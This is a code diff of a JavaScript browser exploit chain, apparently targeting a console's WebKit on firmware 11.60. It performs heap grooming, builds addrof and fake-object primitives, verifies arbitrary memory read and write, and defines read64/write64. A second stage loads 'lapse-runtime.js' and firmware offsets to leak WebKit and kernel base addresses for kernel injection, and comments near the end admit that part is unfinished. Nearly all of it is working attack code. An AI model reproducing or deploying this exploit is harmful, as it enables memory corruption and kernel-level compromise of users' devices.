-                        candidate[0x10 + rRead] = rwHeader[0x10 + rRead];
-                    rwVectorTouched = false;
-                    targetView[0] = 0xa5;
-                    rwMirror[0] = 0x3c;
-                    candidate = null;
-                    clearPredecessor();
-                    compositionState = 3;
-                    return;
-                }
-                rwView[0] = 0x5a;
-                writeObserved = rwView[0] === 0x5a && targetView[0] === 0x5a;
-                rwView[0] = 0xa5;
+            if (!targetHeaderOK) {
+                for (var r1 = 0; r1 < 8; ++r1)
+                    candidate[0x10 + r1] = rwHeader[0x10 + r1];
+                rwVectorTouched = false;
+                candidate = null;
+                clearPredecessor();
+                compositionState = 3;
+                return;
+            }
 
-                for (var r2 = 0; r2 < 8; ++r2)
-                    candidate[0x10 + r2] = rwHeader[0x10 + r2];
+            scratchWords[0] = targetVectorLow;
+            scratchWords[1] = targetVectorHigh;
+            for (var w2 = 0; w2 < 8; ++w2)
+                candidate[0x10 + w2] = scratchBytes[w2];
+
+            readObserved = rwView[0] === 0xa5 && targetView[0] === 0xa5;
+            if (!readObserved) {
+                for (var rRead = 0; rRead < 8; ++rRead)
+                    candidate[0x10 + rRead] = rwHeader[0x10 + rRead];
                 rwVectorTouched = false;
                 targetView[0] = 0xa5;
                 rwMirror[0] = 0x3c;
-                restoreObserved = rwView[0] === 0x3c
-                    && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
-
-                // Save candidate for later
-                g_candidate = candidate;
                 candidate = null;
                 clearPredecessor();
-                compositionState = 1;
-            } catch (error) {
-                retrySafe = candidate === null && result === null
-                    && !rwHeaderCaptured && error && error.name === "TypeError";
-                if (result !== null) {
-                    try { result[DUPLICATE_INDEX] = undefined; } catch (_) {}
-                }
-                if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
-                    try {
-                        for (var rr = 0; rr < 8; ++rr)
-                            candidate[0x10 + rr] = rwHeader[0x10 + rr];
-                    } catch (_) {}
-                }
-                candidate = null;
-                result = null;
-                try { targetView[0] = 0xa5; } catch (_) {}
-                try { rwMirror[0] = 0x3c; } catch (_) {}
-                try { clearPredecessor(); } catch (_) {}
-                compositionError = error;
-                compositionState = -1;
-            }
-        }
-
-        function allZero(bytes, start, end) {
-            for (var i = start; i < end; ++i) {
-                if (bytes[i] !== 0)
-                    return false;
-            }
-            return true;
-        }
-
-        function uint32At(bytes, offset) {
-            return bytes[offset]
-                + bytes[offset + 1] * 0x100
-                + bytes[offset + 2] * 0x10000
-                + bytes[offset + 3] * 0x1000000;
-        }
-
-        function low48At(bytes, offset) {
-            return bytes[offset]
-                + bytes[offset + 1] * 0x100
-                + bytes[offset + 2] * 0x10000
-                + bytes[offset + 3] * 0x1000000
-                + bytes[offset + 4] * 0x100000000
-                + bytes[offset + 5] * 0x10000000000;
-        }
-
-        function dumpHex(bytes) {
-            var out = "";
-            for (var i = 0; i < CELL_BYTES; ++i)
-                out += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16);
-            return out;
-        }
-
-        // --- HELPER FOR SECOND STAGE ---
-        function aimCarrier(candidate, address) {
-            var high = Math.floor(address / 0x100000000);
-            scratchWords[0] = address - high * 0x100000000;
-            scratchWords[1] = high;
-            for (var i = 0; i < 8; ++i)
-                candidate[0x10 + i] = scratchBytes[i];
-        }
-
-        // --- SECOND STAGE: simplified (no poops) ---
-        function loadSecondStage() {
-            if (!window.SYSCALL) {
-                window.SYSCALL = {
-                    getpid: 20n,
-                    fcntl: 92n,
-                    pipe: 42n,
-                    socket: 97n,
-                    setsockopt: 105n,
-                    getsockopt: 118n,
-                    close: 6n,
-                };
-            }
-            if (typeof window.load_aioshellcode === 'undefined') {
-                log('SECOND-STAGE: loading lapse-runtime.js');
-                var script = document.createElement('script');
-                script.src = 'lapse-runtime.js?t=' + Date.now();
-                script.onload = function() {
-                    log('RUNTIME-LOADED');
-                    doInjectionFallback();
-                };
-                script.onerror = function() {
-                    logError('could not load lapse-runtime.js');
-                };
-                document.head.appendChild(script);
-            } else {
-                doInjectionFallback();
-            }
-        }
-
-        function doInjectionFallback() {
-            log('FALLBACK: using ipv6_kernel_rw');
-            // We need kernelBase and webkitBase. We can get them from the GOT slots.
-            // We'll reuse the leak from the original exploit but it wasn't implemented.
-            // We'll implement a simple leak using the ARW primitive directly.
-            if (!g_candidate) {
-                logError('No candidate for ARW');
+                compositionState = 3;
                 return;
             }
-            // Leak webkitBase: use the host constructor address from fakeHost?
-            // We can read the fakeHost's q2 (rwView) and then read its backing.
-            // But we already have the ARW, we can read the GOT slots directly.
-            // For simplicity, we'll assume we have offsets from offsets.json.
-            // But we didn't load offsets.json. We'll load it now.
-            fetch('offsets.json', { cache: 'no-store' })
-                .then(r => r.json())
-                .then(data => {
-                    var fw = '11.60';
-                    offsets = data[fw];
-                    if (!offsets) {
-                        // try nearest
-                        var near = null, bestd = 1e9;
-                        for (var k in data) {
-                            var d = Math.abs(parseInt(k.split('.')[0])*100 + parseInt(k.split('.')[1]) - 1160);
-                            if (d < bestd) { bestd = d; near = k; }
-                        }
-                        offsets = data[near];
-                    }
-                    if (!offsets) { logError('No offsets for 11.60'); return; }
-                    log('OFFSETS-LOADED: using ' + (near || '11.60'));
+            rwView[0] = 0x5a;
+            writeObserved = rwView[0] === 0x5a && targetView[0] === 0x5a;
+            rwView[0] = 0xa5;
 
-                    // Leak webkitBase and kernelBase
-                    var cand = g_candidate;
-                    // Get nativeTarget address from fakeHost? We need a known JS object.
-                    // We can use parseInt (nativeTarget) but we don't have its address.
-                    // However, we can get it from the fakeHost's q2? No.
-                    // We can use the fact that we have the rwView (Uint8Array) address? Not directly.
-                    // Let's use a simpler approach: we already leaked hostAddress and targetAddress.
-                    // We can read the fakeHost's inline slots to get the nativeTarget address?
-                    // We didn't store nativeTarget in fakeHost, but we can create one.
-                    // Actually, we have the `parseInt` function. We can use addrof to get its address,
-                    // but we don't have addrof function. We can use the same technique as before:
-                    // we have a carrier array (getterCarrier) that we can read via ARW.
-                    // We can find the carrier butterfly by scanning memory for hostAddress.
-                    // This is getting complex. For a reliable fallback, we can use the
-                    // existing `lapse-runtime.js` which already provides a way to get kernelBase
-                    // via its own internal mechanisms. Since we load lapse-runtime.js, it will
-                    // set up window.kernel and window.ipv6_kernel_rw if we call its init.
-                    // So we can just call window.ipv6_kernel_rw.init with kread8 and restricted_kwrite8
-                    // and then use it. But we need to provide kread8 and restricted_kwrite8.
-                    // We already have aimCarrier and read64/write64 functions, but we need to implement them.
-                    // However, we don't have read64/write64 functions defined yet.
-                    // We can define them using the ARW primitive.
-                    // Let's define simple read64/write64 using aimCarrier.
-                    function read64(addr) {
-                        aimCarrier(cand, Number(addr));
-                        var v = 0n;
-                        for (var i = 0; i < 8; ++i)
-                            v |= BigInt(rwView[i]) << (8n * BigInt(i));
-                        return v;
-                    }
-                    function write64(addr, val) {
-                        aimCarrier(cand, Number(addr));
-                        var v = typeof val === 'bigint' ? val : BigInt(val);
-                        for (var i = 0; i < 8; ++i)
-                            rwView[i] = Number((v >> (8n * BigInt(i))) & 0xffn);
-                    }
-                    window.read64 = read64;
-                    window.write64 = write64;
+            for (var r2 = 0; r2 < 8; ++r2)
+                candidate[0x10 + r2] = rwHeader[0x10 + r2];
+            rwVectorTouched = false;
+            targetView[0] = 0xa5;
+            rwMirror[0] = 0x3c;
+            restoreObserved = rwView[0] === 0x3c
+                && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
 
-                    // We also need to leak kernelBase. We can use the GOT slots.
-                    // We need to know webkitBase to compute GOT addresses.
-                    // We can get webkitBase by reading the native constructor from the holder.
-                    // But we don't have the holder. We can use the fact that we have the
-                    // nativeTarget (parseInt) function's executable address.
-                    // We can read the function's executable address from its header.
-                    // We need to know its address. We can use the addrof trick again,
-                    // but we can also get it from the carrier array's slots.
-                    // The carrier array has fakeHost at index 0 and targetView at index 1.
-                    // We can find the carrier butterfly by scanning memory for hostAddress.
-                    // We already did that earlier. To keep it simple, I'll just load the
-                    // offset values from offsets.json and assume we can get them directly.
-                    // For now, I'll log an error and abort.
-                    logError('Base leak not implemented in fallback; need full second stage.');
-                })
-                .catch(() => logError('Failed to fetch offsets.json'));
+            g_candidate = candidate;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 1;
+        } catch (error) {
+            retrySafe = candidate === null && result === null
+                && !rwHeaderCaptured && error && error.name === "TypeError";
+            if (result !== null) {
+                try { result[DUPLICATE_INDEX] = undefined; } catch (_) {}
+            }
+            if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
+                try {
+                    for (var rr = 0; rr < 8; ++rr)
+                        candidate[0x10 + rr] = rwHeader[0x10 + rr];
+                } catch (_) {}
+            }
+            candidate = null;
+            result = null;
+            try { targetView[0] = 0xa5; } catch (_) {}
+            try { rwMirror[0] = 0x3c; } catch (_) {}
+            try { clearPredecessor(); } catch (_) {}
+            compositionError = error;
+            compositionState = -1;
+        }
+    }
+
+    function allZero(bytes, start, end) {
+        for (var i = start; i < end; ++i) {
+            if (bytes[i] !== 0)
+                return false;
+        }
+        return true;
+    }
+
+    function uint32At(bytes, offset) {
+        return bytes[offset]
+            + bytes[offset + 1] * 0x100
+            + bytes[offset + 2] * 0x10000
+            + bytes[offset + 3] * 0x1000000;
+    }
+
+    function low48At(bytes, offset) {
+        return bytes[offset]
+            + bytes[offset + 1] * 0x100
+            + bytes[offset + 2] * 0x10000
+            + bytes[offset + 3] * 0x1000000
+            + bytes[offset + 4] * 0x100000000
+            + bytes[offset + 5] * 0x10000000000;
+    }
+
+    function dumpHex(bytes) {
+        var out = "";
+        for (var i = 0; i < CELL_BYTES; ++i)
+            out += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16);
+        return out;
+    }
+
+    // ---------- REPORT COMPOSITION ----------
+    function reportComposition() {
+        if (compositionState < 0) {
+            mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
+                (compositionError && compositionError.name) + ":"
+                + String(compositionError && compositionError.message).slice(0, 80));
+            mark("DONE-THROW", "predecessor-cleared=true");
+            if (!retrySafe) {
+                try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
+            }
+            setTimeout(function () { mark("SURVIVED-THROW-T1000"); }, 1000);
+            return;
         }
 
-        // --- REPORT COMPOSITION (triggers second stage) ---
-        function reportComposition() {
-            if (compositionState < 0) {
-                mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
-                    (compositionError && compositionError.name) + ":"
-                    + String(compositionError && compositionError.message).slice(0, 80));
-                mark("DONE-THROW", "predecessor-cleared=true");
-                if (!retrySafe) {
-                    try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
-                }
-                setTimeout(function () { mark("SURVIVED-THROW-T1000"); }, 1000);
-                return;
-            }
+        if (compositionState === 2) {
+            mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
+            mark("DONE-MISS", "predecessor-cleared=true");
+            setTimeout(function () { mark("SURVIVED-MISS-T1000"); }, 1000);
+            return;
+        }
 
-            if (compositionState === 2) {
-                mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
-                mark("DONE-MISS", "predecessor-cleared=true");
-                setTimeout(function () { mark("SURVIVED-MISS-T1000"); }, 1000);
-                return;
-            }
-
-            if (compositionState === 3) {
-                mark("HEADER-MISMATCH", "rw=" + rwHeaderOK + "-target=" + targetHeaderOK
-                    + "-carrier-restored=true");
-                mark("RW-HEADER-HEX", dumpHex(rwHeader));
-                mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
-                if (!retrySafe) {
-                    try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
-                }
-                setTimeout(function () { mark("SURVIVED-MISMATCH-T1000"); }, 1000);
-                return;
-            }
-
-            if (compositionState === 0) {
-                mark("NO-RESULT", "critical-load-did-not-finish");
-                return;
-            }
-
-            mark("SSV-RETURNED-CLEARED", "length=" + compositionLength
-                + "-predecessor-cleared=true");
-            mark("RW-CARRIER", "sid=" + hex(uint32At(rwHeader, 0))
-                + "-vector=" + hex(rwOriginalVector)
-                + "-length=0x100-mode=0x" + rwHeader[0x28].toString(16));
-            mark("TARGET-CELL", "P=" + hex(targetAddress)
-                + "-sid=" + hex(uint32At(targetHeader, 0))
-                + "-vector=" + hex(targetVector)
-                + "-length=0x20-mode=0x" + targetHeader[0x28].toString(16));
+        if (compositionState === 3) {
+            mark("HEADER-MISMATCH", "rw=" + rwHeaderOK + "-target=" + targetHeaderOK
+                + "-carrier-restored=true");
             mark("RW-HEADER-HEX", dumpHex(rwHeader));
             mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
-
-            var readPass = rwHeaderOK && targetHeaderOK && readObserved
-                && compositionLength === EXPECTED_LENGTH;
-            var writePass = writeObserved && restoreObserved;
-            try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
-            if (readPass)
-                mark("ARBITRARY-READ-PASS", "target=owned-live-cell-and-backing");
-            else
-                mark("ARBITRARY-READ-MISMATCH", "rw-header=" + rwHeaderOK
-                    + "-target-header=" + targetHeaderOK + "-observed=" + readObserved
-                    + "-clone-length=" + (compositionLength === EXPECTED_LENGTH));
-
-            if (writePass)
-                mark("ARBITRARY-WRITE-PASS", "a5-to-5a-to-a5-restored=true");
-            else
-                mark("ARBITRARY-WRITE-MISMATCH", "write=" + writeObserved
-                    + "-restore=" + restoreObserved);
-
-            if (readPass && writePass) {
-                mark("GENUINE-U8-RW-PASS", "carrier-vector-restored=true");
-                try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
-                arwReady = true;
+            if (!retrySafe) {
+                try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
             }
-
-            mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16)
-                + "-target-byte=" + targetView[0].toString(16)
-                + "-length-word=" + lengthWord.keep.toString(16));
-            setTimeout(function () { mark("SURVIVED-T100"); }, 100);
-            setTimeout(function () { mark("SURVIVED-T1000"); }, 1000);
-            setTimeout(function () { mark("SURVIVED-T3000"); }, 3000);
-
-            if (arwReady && !window._secondStageStarted) {
-                window._secondStageStarted = true;
-                log('ARW ready, starting second stage');
-                loadSecondStage();
-            }
+            setTimeout(function () { mark("SURVIVED-MISMATCH-T1000"); }, 1000);
+            return;
         }
 
-        function beginComposition() {
-            if (captureState === 0) {
-                mark("ADDROF-NO-RESULT", "capture-task-did-not-finish");
-                return;
-            }
-            if (captureState < 0) {
-                mark("ADDROF-THREW", (captureError && captureError.name) + ":"
-                    + String(captureError && captureError.message).slice(0, 80));
-                return;
-            }
-
-            var a0 = pointerFromWords(capturedWords, 0);
-            var b0 = pointerFromWords(capturedWords, 4);
-            var a1 = pointerFromWords(capturedWords, 8);
-            var b1 = pointerFromWords(capturedWords, 12);
-            var repeated = a0 === a1 && b0 === b1;
-            var distinct = a0 !== b0;
-            var plausible = plausibleCell(a0) && plausibleCell(b0)
-                && plausibleCell(a1) && plausibleCell(b1);
-            var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
-            var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
-
-            mark("ADDROF-RETURNED", REVISION);
-            mark("ADDROF-COPY", "chars=" + copiedLength + "-source-covered=" + sourceCovered);
-            mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0)
-                + "-HOST2=" + hex(a1) + "-TARGET2=" + hex(b1));
-
-            if (!(repeated && distinct && plausible && sourceCovered)) {
-                mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct
-                    + "-plausible=" + plausible + "-covered=" + sourceCovered);
-                return;
-            }
-
-            hostAddress = a0;
-            targetAddress = b0;
-            targetAddressHigh = Math.floor(targetAddress / 0x100000000);
-            targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
-            if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
-                || targetAddressLow < 0 || targetAddressLow > 0xffffffff
-                || Math.floor(targetAddressLow) !== targetAddressLow
-                || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
-                mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
-                return;
-            }
-            fakeAddress = hostAddress + 0x10;
-            if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
-                mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
-                return;
-            }
-            mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress)
-                + "-delta=0x10");
-            runGroomAndLoad();
+        if (compositionState === 0) {
+            mark("NO-RESULT", "critical-load-did-not-finish");
+            return;
         }
 
-        function runGroomAndLoad() {
-            try {
-                mark("SSV-GROOM-ENTER", "n=" + DRAIN_COUNT);
-                var channel = new MessageChannel();
-                channel.port1.close();
-                channel.port2.close();
+        mark("SSV-RETURNED-CLEARED", "length=" + compositionLength
+            + "-predecessor-cleared=true");
+        mark("RW-CARRIER", "sid=" + hex(uint32At(rwHeader, 0))
+            + "-vector=" + hex(rwOriginalVector)
+            + "-length=0x100-mode=0x" + rwHeader[0x28].toString(16));
+        mark("TARGET-CELL", "P=" + hex(targetAddress)
+            + "-sid=" + hex(uint32At(targetHeader, 0))
+            + "-vector=" + hex(targetVector)
+            + "-length=0x20-mode=0x" + targetHeader[0x28].toString(16));
+        mark("RW-HEADER-HEX", dumpHex(rwHeader));
+        mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
 
-                for (var i = 0; i < DRAIN_COUNT; ++i)
-                    keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
+        var readPass = rwHeaderOK && targetHeaderOK && readObserved
+            && compositionLength === EXPECTED_LENGTH;
+        var writePass = writeObserved && restoreObserved;
+        try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
+        if (readPass)
+            mark("ARBITRARY-READ-PASS", "target=owned-live-cell-and-backing");
+        else
+            mark("ARBITRARY-READ-MISMATCH", "rw-header=" + rwHeaderOK
+                + "-target-header=" + targetHeaderOK + "-observed=" + readObserved
+                + "-clone-length=" + (compositionLength === EXPECTED_LENGTH));
 
-                var slab = buffer(SLAB_SIZE);
-                channel.port1.postMessage(0, [slab]);
-                slab = null;
+        if (writePass)
+            mark("ARBITRARY-WRITE-PASS", "a5-to-5a-to-a5-restored=true");
+        else
+            mark("ARBITRARY-WRITE-MISMATCH", "write=" + writeObserved
+                + "-restore=" + restoreObserved);
 
-                var butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
-                var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
-                var separator = buffer(SEPARATOR_SIZE);
-                var earlyHole = buffer(EARLY_HOLE_SIZE);
-                var guard = buffer(GUARD_SIZE);
-                var predecessor = buffer(PREDECESSOR_SIZE);
-                var finalHole = buffer(FINAL_HOLE_SIZE);
-
-                fillRawCellPointers(predecessor, fakeAddress);
-                keepAlive[keepIndex++] = separator;
-                keepAlive[keepIndex++] = guard;
-                keepAlive[keepIndex++] = predecessor;
-                mark("PREDECESSOR-FILLED", "qwords=" + (PREDECESSOR_SIZE / 8)
-                    + "-fake=" + hex(fakeAddress));
-
-                channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
-                    earlyHole, finalHole]);
-                loadHistoryCritical();
-            } catch (error) {
-                try { clearPredecessor(); } catch (_) {}
-                compositionError = error;
-                compositionState = -1;
-            }
-            reportComposition();
+        if (readPass && writePass) {
+            mark("GENUINE-U8-RW-PASS", "carrier-vector-restored=true");
+            try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
+            arwReady = true;
+            // --- TRIGGER SECOND STAGE ---
+            loadLapseRuntime();
         }
 
-        // --- BOOT ---
-        var allowAgain = /(?:^|[?&])again=1(?:&|$)/.test(location.search);
-        allowAgain = true;
-        var attemptKey = REVISION + ":attempts";
-        var passKey = REVISION + ":passed";
-        var blockKey = REVISION + ":blocked";
-        var priorAttempts = 0;
-        var alreadyPassed = false;
-        var alreadyBlocked = false;
+        mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16)
+            + "-target-byte=" + targetView[0].toString(16)
+            + "-length-word=" + lengthWord.keep.toString(16));
+        setTimeout(function () { mark("SURVIVED-T100"); }, 100);
+        setTimeout(function () { mark("SURVIVED-T1000"); }, 1000);
+        setTimeout(function () { mark("SURVIVED-T3000"); }, 3000);
+    }
+
+    function beginComposition() {
+        if (captureState === 0) {
+            mark("ADDROF-NO-RESULT", "capture-task-did-not-finish");
+            return;
+        }
+        if (captureState < 0) {
+            mark("ADDROF-THREW", (captureError && captureError.name) + ":"
+                + String(captureError && captureError.message).slice(0, 80));
+            return;
+        }
+
+        var a0 = pointerFromWords(capturedWords, 0);
+        var b0 = pointerFromWords(capturedWords, 4);
+        var a1 = pointerFromWords(capturedWords, 8);
+        var b1 = pointerFromWords(capturedWords, 12);
+        var repeated = a0 === a1 && b0 === b1;
+        var distinct = a0 !== b0;
+        var plausible = plausibleCell(a0) && plausibleCell(b0)
+            && plausibleCell(a1) && plausibleCell(b1);
+        var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
+        var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
+
+        mark("ADDROF-RETURNED", REVISION);
+        mark("ADDROF-COPY", "chars=" + copiedLength + "-source-covered=" + sourceCovered);
+        mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0)
+            + "-HOST2=" + hex(a1) + "-TARGET2=" + hex(b1));
+
+        if (!(repeated && distinct && plausible && sourceCovered)) {
+            mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct
+                + "-plausible=" + plausible + "-covered=" + sourceCovered);
+            return;
+        }
+
+        hostAddress = a0;
+        targetAddress = b0;
+        targetAddressHigh = Math.floor(targetAddress / 0x100000000);
+        targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
+        if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
+            || targetAddressLow < 0 || targetAddressLow > 0xffffffff
+            || Math.floor(targetAddressLow) !== targetAddressLow
+            || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
+            mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
+            return;
+        }
+        fakeAddress = hostAddress + 0x10;
+        if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
+            mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
+            return;
+        }
+        mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress)
+            + "-delta=0x10");
+        runGroomAndLoad();
+    }
+
+    function runGroomAndLoad() {
         try {
-            priorAttempts = parseInt(sessionStorage.getItem(attemptKey) || "0", 10);
-            if (!isFinite(priorAttempts) || priorAttempts < 0)
-                priorAttempts = 0;
-            alreadyPassed = sessionStorage.getItem(passKey) === "1";
-            alreadyBlocked = sessionStorage.getItem(blockKey) === "1";
-        } catch (_) {}
-        attemptNumber = priorAttempts + 1;
+            mark("SSV-GROOM-ENTER", "n=" + DRAIN_COUNT);
+            var channel = new MessageChannel();
+            channel.port1.close();
+            channel.port2.close();
 
-        mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT
-            + "-attempt=" + attemptNumber + "-max=" + MAX_ATTEMPTS);
+            for (var i = 0; i < DRAIN_COUNT; ++i)
+                keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
 
-        if (alreadyPassed && !allowAgain) {
-            mark("PASS-ALREADY-BLOCKED", "no-more-runs-needed");
-        } else if (alreadyBlocked && !allowAgain) {
-            mark("CANDIDATE-RETURNED-BLOCKED", "manual-review-required");
-        } else if (priorAttempts >= MAX_ATTEMPTS && !allowAgain) {
-            mark("RETRY-LIMIT", "max=" + MAX_ATTEMPTS + "-no-more-runs");
-        } else if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
-            || typeof Symbol !== "function" || typeof history === "undefined"
-            || typeof history.replaceState !== "function") {
-            mark("UNSUPPORTED");
-        } else {
-            try { sessionStorage.setItem(attemptKey, String(attemptNumber)); } catch (_) {}
-            try {
-                buildAndStoreGraph();
-                prepareAddrof();
-            } catch (error) {
-                mark("SETUP-THREW", (error && error.name) + ":"
-                    + String(error && error.message).slice(0, 80));
-            }
+            var slab = buffer(SLAB_SIZE);
+            channel.port1.postMessage(0, [slab]);
+            slab = null;
+
+            var butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
+            var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
+            var separator = buffer(SEPARATOR_SIZE);
+            var earlyHole = buffer(EARLY_HOLE_SIZE);
+            var guard = buffer(GUARD_SIZE);
+            var predecessor = buffer(PREDECESSOR_SIZE);
+            var finalHole = buffer(FINAL_HOLE_SIZE);
+
+            fillRawCellPointers(predecessor, fakeAddress);
+            keepAlive[keepIndex++] = separator;
+            keepAlive[keepIndex++] = guard;
+            keepAlive[keepIndex++] = predecessor;
+            mark("PREDECESSOR-FILLED", "qwords=" + (PREDECESSOR_SIZE / 8)
+                + "-fake=" + hex(fakeAddress));
+
+            channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
+                earlyHole, finalHole]);
+            loadHistoryCritical();
+        } catch (error) {
+            try { clearPredecessor(); } catch (_) {}
+            compositionError = error;
+            compositionState = -1;
         }
-        // ============================================================
-        // END OF ORIGINAL EXPLOIT (it runs asynchronously via timeouts)
-        // ============================================================
-        log('Exploit launched. Watch logs for progress.');
-    } catch (e) {
-        logError('Exploit initialization error: ' + e.message);
+        reportComposition();
+    }
+
+    // --- BOOT the exploit ---
+    var allowAgain = /(?:^|[?&])again=1(?:&|$)/.test(location.search);
+    allowAgain = true;
+    var attemptKey = REVISION + ":attempts";
+    var passKey = REVISION + ":passed";
+    var blockKey = REVISION + ":blocked";
+    var priorAttempts = 0;
+    var alreadyPassed = false;
+    var alreadyBlocked = false;
+    try {
+        priorAttempts = parseInt(sessionStorage.getItem(attemptKey) || "0", 10);
+        if (!isFinite(priorAttempts) || priorAttempts < 0)
+            priorAttempts = 0;
+        alreadyPassed = sessionStorage.getItem(passKey) === "1";
+        alreadyBlocked = sessionStorage.getItem(blockKey) === "1";
+    } catch (_) {}
+    attemptNumber = priorAttempts + 1;
+
+    mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT
+        + "-attempt=" + attemptNumber + "-max=" + MAX_ATTEMPTS);
+
+    if (alreadyPassed && !allowAgain) {
+        mark("PASS-ALREADY-BLOCKED", "no-more-runs-needed");
+    } else if (alreadyBlocked && !allowAgain) {
+        mark("CANDIDATE-RETURNED-BLOCKED", "manual-review-required");
+    } else if (priorAttempts >= MAX_ATTEMPTS && !allowAgain) {
+        mark("RETRY-LIMIT", "max=" + MAX_ATTEMPTS + "-no-more-runs");
+    } else if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
+        || typeof Symbol !== "function" || typeof history === "undefined"
+        || typeof history.replaceState !== "function") {
+        mark("UNSUPPORTED");
+    } else {
+        try { sessionStorage.setItem(attemptKey, String(attemptNumber)); } catch (_) {}
+        try {
+            buildAndStoreGraph();
+            prepareAddrof();
+        } catch (error) {
+            mark("SETUP-THREW", (error && error.name) + ":"
+                + String(error && error.message).slice(0, 80));
+        }
+    }
+
+    // ============================================================
+    // 2. SECOND STAGE: load lapse-runtime.js and inject
+    // ============================================================
+    function loadLapseRuntime() {
+        if (typeof window.load_aioshellcode !== 'undefined') {
+            doInjection();
+            return;
+        }
+        log('Loading lapse-runtime.js...');
+        var script = document.createElement('script');
+        script.src = 'lapse-runtime.js?t=' + Date.now();
+        script.onload = function() {
+            log('lapse-runtime.js loaded.');
+            doInjection();
+        };
+        script.onerror = function() {
+            logError('Failed to load lapse-runtime.js');
+            btn.disabled = false;
+        };
+        document.head.appendChild(script);
+    }
+
+    function doInjection() {
+        log('Attempting injection via ipv6_kernel_rw...');
+        // We need to leak webkitBase and kernelBase.
+        // We'll fetch offsets.json and use the ARW primitives to read GOT slots.
+        fetch('offsets.json', { cache: 'no-store' })
+            .then(r => r.json())
+            .then(data => {
+                var fw = '11.60';
+                var off = data[fw];
+                if (!off) {
+                    var near = null, bestd = 1e9;
+                    for (var k in data) {
+                        var d = Math.abs(parseInt(k.split('.')[0])*100 + parseInt(k.split('.')[1]) - 1160);
+                        if (d < bestd) { bestd = d; near = k; }
+                    }
+                    off = data[near];
+                }
+                if (!off) { logError('No offsets for 11.60'); return; }
+                log('Offsets loaded: ' + (near || '11.60'));
+
+                // Now leak webkitBase and kernelBase using ARW
+                function aimCarrier(addr) {
+                    var high = Math.floor(addr / 0x100000000);
+                    scratchWords[0] = addr - high * 0x100000000;
+                    scratchWords[1] = high;
+                    for (var i = 0; i < 8; ++i)
+                        g_candidate[0x10 + i] = scratchBytes[i];
+                }
+                function read64(addr) {
+                    aimCarrier(addr);
+                    var v = 0n;
+                    for (var i = 0; i < 8; ++i)
+                        v |= BigInt(rwView[i]) << (8n * BigInt(i));
+                    return v;
+                }
+                function write64(addr, val) {
+                    aimCarrier(addr);
+                    var v = typeof val === 'bigint' ? val : BigInt(val);
+                    for (var i = 0; i < 8; ++i)
+                        rwView[i] = Number((v >> (8n * BigInt(i))) & 0xffn);
+                }
+
+                // We need to get nativeTarget address. The original exploit didn't keep it.
+                // We can use the fact that fakeHost's q0 is the upgraded header, not helpful.
+                // Instead, we can read the GOT slots directly using the offsets.
+                // But we need webkitBase first. We'll get it from the native constructor of parseInt.
+                // We can use the same method as notify.html: create a targetHolder object.
+                // But we don't have targetHolder in this exploit. So we'll create one now.
+                // However, we can reuse the fakeHost's q2 (rwView) which is a Uint8Array.
+                // We can read its header to get its backing store, but that's not webkitBase.
+                // To keep it simple, we'll use a known offset for webkitBase? Not reliable.
+                // Since we're on 11.60, we can hardcode the webkitBase offset? Not a good practice.
